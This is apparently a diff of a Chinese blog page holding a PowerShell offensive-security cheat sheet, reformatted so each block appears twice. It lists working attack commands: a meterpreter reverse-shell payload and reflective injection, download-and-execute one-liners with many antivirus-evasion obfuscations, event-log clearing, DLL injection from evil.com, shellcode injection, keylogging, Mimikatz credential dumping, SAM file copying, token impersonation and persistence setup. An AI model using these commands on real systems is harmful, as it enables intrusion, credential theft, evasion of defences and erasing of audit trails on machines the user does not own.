 <p>使用脚本<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">Invoke-ReflectivePEInjection</a>直接注入EXE文件，注入步骤：</p>
-<pre><code>1) 生成msf木马
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1) 生成msf木马</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp -e -i 3 LHOST=192.168.168.1 LPORT=2333 -f exe -o ~/shell.exe</span><br><span class="line"></span><br><span class="line">2) 通过下面的注入</span><br><span class="line"></span><br><span class="line">$PEBytes = [IO.File]::ReadAllBytes(&#x27;.\Desktop\powershell\shell.exe&#x27;)</span><br><span class="line">Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR</span><br></pre></td></tr></table></figure>
 
-msfvenom -p windows/x64/meterpreter_reverse_tcp -e -i 3 LHOST=192.168.168.1 LPORT=2333 -f exe -o ~/shell.exe
-
-2) 通过下面的注入
-
-$PEBytes = [IO.File]::ReadAllBytes(&#39;.\Desktop\powershell\shell.exe&#39;)
-Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
-</code></pre>
 <h3 id="3-混淆技术"><a href="#3-混淆技术" class="headerlink" title="3. 混淆技术"></a>3. 混淆技术</h3><p>远程下载代码脚本执行</p>
-<pre><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://192.168.0.1/powershell&quot;)
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://192.168.0.1/powershell&quot;)</span><br></pre></td></tr></table></figure>
+
 <p>混淆方式</p>
-<pre><code>1) 去掉System关键字 
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1) 去掉System关键字 </span><br><span class="line"></span><br><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.1/powershell&quot;)</span><br><span class="line"></span><br><span class="line">2) 使用字符串连接+号连接 </span><br><span class="line"></span><br><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;ht&quot;+&quot;tp://192.168.0.1/powershell&quot;)</span><br><span class="line"></span><br><span class="line">3) 使用Invoke方法 </span><br><span class="line"></span><br><span class="line">Invoke-Expression (New-Object Net.WebClient).(&quot;DownloadString&quot;).Invoke(&#x27;h&#x27;+&#x27;ttp://192.168.0.1/powershell&#x27;) $ds=&quot;Down&quot;+&quot;loadString&quot;;Invoke-Expression (New-Object Net.WebClient).$ds.Invoke(&#x27;h&#x27;+&#x27;ttp://192.168.0.1/powershell&#x27;)</span><br><span class="line"></span><br><span class="line">4) 变量替代 </span><br><span class="line"></span><br><span class="line">IEX $test=New-Object Net.WebClient;$test.DownloadString(&#x27;h&#x27;+&#x27;ttp://192.168.0.1/powershell&#x27;)</span><br><span class="line"></span><br><span class="line">5) 关键字+单双引号 </span><br><span class="line"></span><br><span class="line">Invoke-Expression (New-Object Net.WebClient).&quot;DownloadString&quot;(&#x27;h&#x27;+&#x27;ttp://192.168.0.1/powershell&#x27;)</span><br><span class="line"></span><br><span class="line">6) 转义符号 </span><br><span class="line"></span><br><span class="line">Invoke-Expression (New-Object Net.WebClient).&quot;D`o`wn`l`oad`Str`in`g&quot;(&#x27;h&#x27;+&#x27;ttp://7ell.me/power&#x27;)</span><br><span class="line"></span><br><span class="line">7) 字符串反转</span><br><span class="line"></span><br><span class="line">$re= &quot;)&#x27;1/1.0.0.721//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;;</span><br><span class="line">IEX ($re[-1..-($re.Length)] -Join &#x27;&#x27;) | IEX</span><br><span class="line"></span><br><span class="line">8) 编码执行</span><br><span class="line"></span><br><span class="line">$command = &quot;Write-Host ‘Hello World!’&quot;</span><br><span class="line">$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) </span><br><span class="line">$encodedCommand = [Convert]::ToBase64String($bytes) </span><br><span class="line">powershell.exe -EncodedCommand $encodedCommand</span><br><span class="line"></span><br><span class="line">9) 替代IEX</span><br><span class="line"></span><br><span class="line">Invoke-Expression/IEX命令是很常用的一个命令， 运行一个以字符串形式提供的PowerShell表达式。可代替IEX的各种执行方式</span><br><span class="line"></span><br><span class="line">    a. &amp;(GAL I*X) : 通过别名的方式来进行编码</span><br><span class="line">    b. Command I*e-E* : 通过command的方式来进行编码</span><br><span class="line">    c. $ExecutionContext.InvokeCommand.GetCmdlets(&#x27;I*e-E*&#x27;)使用环境变量等等</span><br></pre></td></tr></table></figure>
 
-Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.1/powershell&quot;)
-
-2) 使用字符串连接+号连接 
-
-Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;ht&quot;+&quot;tp://192.168.0.1/powershell&quot;)
-
-3) 使用Invoke方法 
-
-Invoke-Expression (New-Object Net.WebClient).(&quot;DownloadString&quot;).Invoke(&#39;h&#39;+&#39;ttp://192.168.0.1/powershell&#39;) $ds=&quot;Down&quot;+&quot;loadString&quot;;Invoke-Expression (New-Object Net.WebClient).$ds.Invoke(&#39;h&#39;+&#39;ttp://192.168.0.1/powershell&#39;)
-
-4) 变量替代 
-
-IEX $test=New-Object Net.WebClient;$test.DownloadString(&#39;h&#39;+&#39;ttp://192.168.0.1/powershell&#39;)
-
-5) 关键字+单双引号 
-
-Invoke-Expression (New-Object Net.WebClient).&quot;DownloadString&quot;(&#39;h&#39;+&#39;ttp://192.168.0.1/powershell&#39;)
-
-6) 转义符号 
-
-Invoke-Expression (New-Object Net.WebClient).&quot;D`o`wn`l`oad`Str`in`g&quot;(&#39;h&#39;+&#39;ttp://7ell.me/power&#39;)
-
-7) 字符串反转
-
-$re= &quot;)&#39;1/1.0.0.721//:ptth&#39;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;;
-IEX ($re[-1..-($re.Length)] -Join &#39;&#39;) | IEX
-
-8) 编码执行
-
-$command = &quot;Write-Host ‘Hello World!’&quot;
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
-$encodedCommand = [Convert]::ToBase64String($bytes) 
-powershell.exe -EncodedCommand $encodedCommand
-
-9) 替代IEX
-
-Invoke-Expression/IEX命令是很常用的一个命令， 运行一个以字符串形式提供的PowerShell表达式。可代替IEX的各种执行方式
-
-    a. &amp;(GAL I*X) : 通过别名的方式来进行编码
-    b. Command I*e-E* : 通过command的方式来进行编码
-    c. $ExecutionContext.InvokeCommand.GetCmdlets(&#39;I*e-E*&#39;)使用环境变量等等
-</code></pre>
 <p><em>tools:</em> <a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
 <h3 id="4-日志操作"><a href="#4-日志操作" class="headerlink" title="4. 日志操作"></a>4. 日志操作</h3><p><strong>CmdLet命令</strong></p>
-<pre><code>Clear-EventLog
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Clear-EventLog</span><br><span class="line"></span><br><span class="line">Get-EventLog</span><br><span class="line"></span><br><span class="line">Get-WinEvent</span><br><span class="line"></span><br><span class="line">Limit-EventLog</span><br><span class="line"></span><br><span class="line">New-EventLog</span><br><span class="line"></span><br><span class="line">Remove-EventLog</span><br><span class="line"></span><br><span class="line">Show-EventLog</span><br><span class="line"></span><br><span class="line">Write-EventLog</span><br></pre></td></tr></table></figure>
 
-Get-EventLog
-
-Get-WinEvent
-
-Limit-EventLog
-
-New-EventLog
-
-Remove-EventLog
-
-Show-EventLog
-
-Write-EventLog
-</code></pre>
 <p><strong>日志查看</strong></p>
-<pre><code>列出事件日志列表: Get-Eventlog -List
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">列出事件日志列表: Get-Eventlog -List</span><br><span class="line"></span><br><span class="line">查看security日志: Get-Eventlog -LogName security</span><br><span class="line"></span><br><span class="line">列出最近日志: Get-EventLog -LogName security -Newest 5</span><br><span class="line"></span><br><span class="line">列出指定时间段内的日志: Get-EventLog -LogName security -After 2020-11-10 -Before 2020-11-15</span><br><span class="line"></span><br><span class="line">根据事件ID列出日志: Get-EventLog -LogName security -InstanceId 4624</span><br><span class="line"></span><br><span class="line">获取某一条事件日志: Get-EventLog -LogName system -Index 12324</span><br></pre></td></tr></table></figure>
 
-查看security日志: Get-Eventlog -LogName security
-
-列出最近日志: Get-EventLog -LogName security -Newest 5
-
-列出指定时间段内的日志: Get-EventLog -LogName security -After 2020-11-10 -Before 2020-11-15
-
-根据事件ID列出日志: Get-EventLog -LogName security -InstanceId 4624
-
-获取某一条事件日志: Get-EventLog -LogName system -Index 12324
-</code></pre>
 <p><strong>日志清除</strong></p>
-<pre><code>1）Remove-Eventlog：注销事件源
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1）Remove-Eventlog：注销事件源</span><br><span class="line"></span><br><span class="line">Remove-EventLog -LogName security  # 仅注销事件源，不删除日志</span><br><span class="line"></span><br><span class="line">Remove-EventLog -Source app  # 注销事件源，app将无法写入事件日志</span><br><span class="line"></span><br><span class="line">2）Clear-Eventlog：清除日志</span><br><span class="line"></span><br><span class="line">Clear-Eventlog -LogName security  # 清除安全相关日志</span><br><span class="line"></span><br><span class="line">Clear-Eventlog -LogName security -computername localhost, Server02  # 直接远程删除日志</span><br></pre></td></tr></table></figure>
 
-Remove-EventLog -LogName security  # 仅注销事件源，不删除日志
-
-Remove-EventLog -Source app  # 注销事件源，app将无法写入事件日志
-
-2）Clear-Eventlog：清除日志
-
-Clear-Eventlog -LogName security  # 清除安全相关日志
-
-Clear-Eventlog -LogName security -computername localhost, Server02  # 直接远程删除日志
-</code></pre>
 <h2 id="0x03-利用框架"><a href="#0x03-利用框架" class="headerlink" title="0x03 利用框架"></a>0x03 利用框架</h2><h3 id="1-PowerSploit"><a href="#1-PowerSploit" class="headerlink" title="1. PowerSploit"></a>1. PowerSploit</h3><h4 id="Find-AVSignature"><a href="#Find-AVSignature" class="headerlink" title="Find-AVSignature"></a>Find-AVSignature</h4><p>寻找反病毒软件特征码，思路类似于二分法</p>
-<pre><code># 假设远控文件偏移范围为0~10000
-Find-AVSignature -StartByte 0 -EndByte 10000 -Interval 5000 -Path test.exe
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 假设远控文件偏移范围为0~10000</span><br><span class="line">Find-AVSignature -StartByte 0 -EndByte 10000 -Interval 5000 -Path test.exe</span><br><span class="line"></span><br><span class="line"># 重复步骤</span><br><span class="line">Find-AVSignature -StartByte 5001 -EndByte 10000 -Interval 2500 -Path test.exe</span><br></pre></td></tr></table></figure>
 
-# 重复步骤
-Find-AVSignature -StartByte 5001 -EndByte 10000 -Interval 2500 -Path test.exe
-</code></pre>
 <p><em>refer:</em> <a target="_blank" rel="noopener" href="http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html">http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html</a></p>
-<h4 id="CodeExecution"><a href="#CodeExecution" class="headerlink" title="CodeExecution"></a>CodeExecution</h4><pre><code>1) Invoke-DLLInjection
+<h4 id="CodeExecution"><a href="#CodeExecution" class="headerlink" title="CodeExecution"></a>CodeExecution</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1) Invoke-DLLInjection</span><br><span class="line"></span><br><span class="line">    DLL注入脚本，dll架构要与目标进程相符，同时要具备相应的权限</span><br><span class="line"></span><br><span class="line">    Invoke-DLLInjection -ProcessID 2366 -dll test.dll</span><br><span class="line"></span><br><span class="line">2）Invoke-ReflectivePEInjection</span><br><span class="line"></span><br><span class="line">    反射型注入，能做到不在目标磁盘上留下文件</span><br><span class="line"></span><br><span class="line">    Invoke-ReflectivePEInjection -PEUrl http://evil.com/test.dll -ProcId 2326  # 下载dll并注入到id为2326的进程中</span><br><span class="line"></span><br><span class="line">    Invoke-ReflectivePEInjection -PEUrl http://evil.com/test.dll -ProcId 2326 -ForceASLR  # 强制使用ASLR</span><br><span class="line"></span><br><span class="line">    Invoke-ReflectivePEInjection -PEPath test.dll  # 从本地加载dll并注入指定进程</span><br><span class="line"></span><br><span class="line">    Invoke-ReflectivePEInjection -PEPath test.dll  # 向exe传参</span><br><span class="line"></span><br><span class="line">3）Invoke-Shellcode</span><br><span class="line"></span><br><span class="line">    向目标进程注入shellcode</span><br><span class="line"></span><br><span class="line">    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.1 lport=6666 -f powershell  # 生成shellcode</span><br><span class="line"></span><br><span class="line">    Invoke-Shellcode -Shellcode @($buf) -Force  # 注入shellcode</span><br><span class="line"></span><br><span class="line">4）Invoke-WmiCommand</span><br><span class="line"></span><br><span class="line">    在目标主机使用wmi执行命令</span><br><span class="line"></span><br><span class="line">    $username = &quot;test\Administrator&quot;</span><br><span class="line">    $password = echo &quot;123456&quot; | ConvertTo-SecureString -AsPlainText -Force</span><br><span class="line">    $c = New-Object System.Management.Automation.PSCredential $username,$password</span><br><span class="line"></span><br><span class="line">    Invoke-Wmicommand -Payload &#123; 1 + 1 &#125; -ComputerName &#x27;192.168.10.1&#x27; -Credential $Credentials</span><br></pre></td></tr></table></figure>
 
-    DLL注入脚本，dll架构要与目标进程相符，同时要具备相应的权限
+<h4 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Get-GPPAutologon</span><br><span class="line"></span><br><span class="line">Get-GPPPassword</span><br><span class="line"></span><br><span class="line">Get-Keystrokes -LogPath .\keylog.txt  # 键盘记录</span><br><span class="line"></span><br><span class="line">Get-MicrophoneAudio -Path .\audio.wav -Length 10  # 通过麦克风记录声音</span><br><span class="line"></span><br><span class="line">Get-TimedScreenshot -Path .\screenshot\ -Interval 10 -EndTime 18:00  # 屏幕记录</span><br><span class="line"></span><br><span class="line">Get-VaultCredential  # 从凭证管理器中获取凭证</span><br><span class="line"></span><br><span class="line">Invoke-CredentialInjection -UserName test -Password 123456 -NewWinLogon</span><br><span class="line"></span><br><span class="line">Invoke-Mimikatz -DumpCreds</span><br><span class="line"></span><br><span class="line">invoke-mimikatz -Command &quot;Privilege::Debug Sekurlsa::logonpasswords&quot;  # 执行mimikaz命令</span><br><span class="line"></span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\SAM.hive  # 某些文件被其他进程占用导致不能复制时时使用，如dump SAM文件</span><br><span class="line"></span><br><span class="line">Invoke-TokenManipulation -Enumerate  # 枚举唯一可用的令牌</span><br><span class="line"></span><br><span class="line">Invoke-TokenManipulation -ShowAll   # 枚举所有的令牌</span><br><span class="line"></span><br><span class="line">Invoke-TokenManipulation -CreateProcess &quot;calc.exe&quot; -Username &quot;NT AUTHORITY\SYSTEM&quot;  # 使用SYSTEM用户的令牌创建一个进程</span><br><span class="line"></span><br><span class="line">Invoke-TokenManipulation -CreateProcess &quot;calc.exe&quot; -ProcessId &quot;2366&quot;  # 通过ID来指定一个Token</span><br><span class="line"></span><br><span class="line">Invoke-TokenManipulation -ImpersonateUser -Username &quot;nt authority\system&quot;  # 使用当前的线程令牌模仿SYSTEM用户</span><br><span class="line"></span><br><span class="line">Out-Minidump -Process (Get-Process -Id 2345) -DumpFilePath .\   # dump指定进程完整的内存镜像</span><br><span class="line"></span><br><span class="line">Get-VolumeShadowCopy  # 列出所有卷影拷贝的路径，需要管理员权限</span><br><span class="line"></span><br><span class="line">New-VolumeShadowCopy -Volume C:\  # 新建卷影拷贝</span><br><span class="line"></span><br><span class="line">Mount-VolumeShadowCopy -Path C:\Users\admin -DevicePath \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1  # 挂载卷影拷贝</span><br><span class="line"></span><br><span class="line">Remove-VolumeShadowCopy -DevicePath \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1  # 删除卷影拷贝</span><br></pre></td></tr></table></figure>
 
-    Invoke-DLLInjection -ProcessID 2366 -dll test.dll
-
-2）Invoke-ReflectivePEInjection
-
-    反射型注入，能做到不在目标磁盘上留下文件
-
-    Invoke-ReflectivePEInjection -PEUrl http://evil.com/test.dll -ProcId 2326  # 下载dll并注入到id为2326的进程中
-
-    Invoke-ReflectivePEInjection -PEUrl http://evil.com/test.dll -ProcId 2326 -ForceASLR  # 强制使用ASLR
-
-    Invoke-ReflectivePEInjection -PEPath test.dll  # 从本地加载dll并注入指定进程
-
-    Invoke-ReflectivePEInjection -PEPath test.dll  # 向exe传参
-
-3）Invoke-Shellcode
-
-    向目标进程注入shellcode
-
-    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.1 lport=6666 -f powershell  # 生成shellcode
-
-    Invoke-Shellcode -Shellcode @($buf) -Force  # 注入shellcode
-
-4）Invoke-WmiCommand
-
-    在目标主机使用wmi执行命令
-
-    $username = &quot;test\Administrator&quot;
-    $password = echo &quot;123456&quot; | ConvertTo-SecureString -AsPlainText -Force
-    $c = New-Object System.Management.Automation.PSCredential $username,$password
-
-    Invoke-Wmicommand -Payload &#123; 1 + 1 &#125; -ComputerName &#39;192.168.10.1&#39; -Credential $Credentials
-</code></pre>
-<h4 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h4><pre><code>Get-GPPAutologon
-
-Get-GPPPassword
-
-Get-Keystrokes -LogPath .\keylog.txt  # 键盘记录
-
-Get-MicrophoneAudio -Path .\audio.wav -Length 10  # 通过麦克风记录声音
-
-Get-TimedScreenshot -Path .\screenshot\ -Interval 10 -EndTime 18:00  # 屏幕记录
-
-Get-VaultCredential  # 从凭证管理器中获取凭证
-
-Invoke-CredentialInjection -UserName test -Password 123456 -NewWinLogon
-
-Invoke-Mimikatz -DumpCreds
-
-invoke-mimikatz -Command &quot;Privilege::Debug Sekurlsa::logonpasswords&quot;  # 执行mimikaz命令
-
-Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\SAM.hive  # 某些文件被其他进程占用导致不能复制时时使用，如dump SAM文件
-
-Invoke-TokenManipulation -Enumerate  # 枚举唯一可用的令牌
-
-Invoke-TokenManipulation -ShowAll   # 枚举所有的令牌
-
-Invoke-TokenManipulation -CreateProcess &quot;calc.exe&quot; -Username &quot;NT AUTHORITY\SYSTEM&quot;  # 使用SYSTEM用户的令牌创建一个进程
-
-Invoke-TokenManipulation -CreateProcess &quot;calc.exe&quot; -ProcessId &quot;2366&quot;  # 通过ID来指定一个Token
-
-Invoke-TokenManipulation -ImpersonateUser -Username &quot;nt authority\system&quot;  # 使用当前的线程令牌模仿SYSTEM用户
-
-Out-Minidump -Process (Get-Process -Id 2345) -DumpFilePath .\   # dump指定进程完整的内存镜像
-
-Get-VolumeShadowCopy  # 列出所有卷影拷贝的路径，需要管理员权限
-
-New-VolumeShadowCopy -Volume C:\  # 新建卷影拷贝
-
-Mount-VolumeShadowCopy -Path C:\Users\admin -DevicePath \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1  # 挂载卷影拷贝
-
-Remove-VolumeShadowCopy -DevicePath \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1  # 删除卷影拷贝
-</code></pre>
 <h4 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h4><p>存放位置：放在<code>%Systemroot%/System32\WindowsPowerShell\v1.0\Modules</code> 或 <code>$Env:HomeDrive$Env:HOMEPATH\Documents\WindowsPowerShell\Modules</code></p>
-<pre><code>$ElevatedOptions = New-ElevatedPersistenceOption  -PermanentWMI -Daily -At &#39;2 PM&#39;
-$UserOptions = New-UserPersistenceOption -Registry -AtLogon
-Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ElevatedOptions = New-ElevatedPersistenceOption  -PermanentWMI -Daily -At &#x27;2 PM&#x27;</span><br><span class="line">$UserOptions = New-UserPersistenceOption -Registry -AtLogon</span><br><span class="line">Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions</span><br></pre></td></tr></table></figure>
+
 <h4 id="Privesc"><a href="#Privesc" class="headerlink" title="Privesc"></a>Privesc</h4><p><strong>Get-System</strong></p>
-<pre><code>get-system -Technique namedpipe/token  # 选择方式
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get-system -Technique namedpipe/token  # 选择方式</span><br><span class="line"></span><br><span class="line">Get-System -RevToSelf  # 恢复令牌</span><br></pre></td></tr></table></figure>
 
-Get-System -RevToSelf  # 恢复令牌
-</code></pre>
-<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h4><pre><code>Get-ComputerDetails  #获取计算机信息
+<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Get-ComputerDetails  #获取计算机信息</span><br><span class="line"></span><br><span class="line">Get-HttpStatus -Target www.example.com -Path C:\dic.txt -UseSSL  # 扫目录脚本</span><br><span class="line"></span><br><span class="line">Invoke-Portscan -Hosts 192.168.1,1 -Ports &quot;135,139,445,1&quot; -Threads 50  # 扫描192.168.1.1/24的135,139,445端口</span><br><span class="line"></span><br><span class="line">Invoke-Portscan -Hosts 192.168.1.1 -TopPorts 50 -Threads 50  # 扫描Top50的端口</span><br><span class="line"></span><br><span class="line">Invoke-Portscan -Hosts 192.168.169.168 -Ports 445 -SkipDiscovery  # 扫描前不ping目标主机</span><br><span class="line"></span><br><span class="line">Invoke-ReverseDnsLookup -IpRange 192.168.1.1-192.168.1.254  # ip反查主机名</span><br></pre></td></tr></table></figure>
 
-Get-HttpStatus -Target www.example.com -Path C:\dic.txt -UseSSL  # 扫目录脚本
+<h4 id="ScriptModification"><a href="#ScriptModification" class="headerlink" title="ScriptModification"></a>ScriptModification</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Out-CompressedDll -FilePath test.dll   # 将dll压缩并base64编码</span><br><span class="line"></span><br><span class="line">Out-EncodedCommand -ScriptBlock &#123;write-host &#x27;whoami&#x27;&#125;  # 脚本块编码</span><br><span class="line"></span><br><span class="line">Out-EncodedCommand -Path .\1.ps1 -WindowStyle Hidden   # 脚本编码</span><br><span class="line"></span><br><span class="line">Out-EncryptedScript -ScriptPath .\1.ps1 -Password fuck -Salt 123 -FilePath .\encrypt.ps1  # 脚本加密</span><br><span class="line"></span><br><span class="line">Remove-Comments -ScriptBlock &#123; whoami &#125;   # 删除空白符</span><br></pre></td></tr></table></figure>
 
-Invoke-Portscan -Hosts 192.168.1,1 -Ports &quot;135,139,445,1&quot; -Threads 50  # 扫描192.168.1.1/24的135,139,445端口
-
-Invoke-Portscan -Hosts 192.168.1.1 -TopPorts 50 -Threads 50  # 扫描Top50的端口
-
-Invoke-Portscan -Hosts 192.168.169.168 -Ports 445 -SkipDiscovery  # 扫描前不ping目标主机
-
-Invoke-ReverseDnsLookup -IpRange 192.168.1.1-192.168.1.254  # ip反查主机名
-</code></pre>
-<h4 id="ScriptModification"><a href="#ScriptModification" class="headerlink" title="ScriptModification"></a>ScriptModification</h4><pre><code>Out-CompressedDll -FilePath test.dll   # 将dll压缩并base64编码
-
-Out-EncodedCommand -ScriptBlock &#123;write-host &#39;whoami&#39;&#125;  # 脚本块编码
-
-Out-EncodedCommand -Path .\1.ps1 -WindowStyle Hidden   # 脚本编码
-
-Out-EncryptedScript -ScriptPath .\1.ps1 -Password fuck -Salt 123 -FilePath .\encrypt.ps1  # 脚本加密
-
-Remove-Comments -ScriptBlock &#123; whoami &#125;   # 删除空白符
-</code></pre>
 <h3 id="2-Nishang"><a href="#2-Nishang" class="headerlink" title="2. Nishang"></a>2. Nishang</h3><h3 id="3-Empire"><a href="#3-Empire" class="headerlink" title="3. Empire"></a>3. Empire</h3><h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
 <li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/powershell/">https://learn.microsoft.com/zh-cn/powershell/</a></li>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters">https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters</a></li>
